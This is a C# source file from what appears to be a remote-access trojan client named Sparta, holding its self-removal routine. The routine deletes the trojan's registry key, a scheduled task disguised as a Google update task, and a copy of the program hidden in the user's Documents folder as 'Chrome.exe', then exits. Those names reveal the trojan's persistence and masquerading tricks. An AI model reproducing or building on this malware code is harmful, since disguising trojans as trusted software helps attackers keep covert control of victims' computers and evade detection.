﻿using Microsoft.Win32;
using RATclientSparta.Setup.RegistryData;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class DeleteApp
    {
        public void Delete()
        {
            //1. removing registry ClientValues key
            //2. removing task scheduler schtask called CompUpdates
            //3. removing app from documents folder
            //4. exit program

            RegistryDelete registry = new RegistryDelete();
            registry.DeleteKey(@"Software\ClientValues");

            Shell PowershellCommand = new Shell();
            PowershellCommand.Run(@"/C schtasks.exe /delete /tn ""GoogleUpdateTaskCore{CAF3204-9215-3589-JGE4N-E34528X8SC}"" /f");

            FileCopy ThisProgram = new FileCopy();
            if (ThisProgram.This() == "exist") //if this program exist at the new hidden path then
                File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe");

            Environment.Exit(0);
        }
    }
}
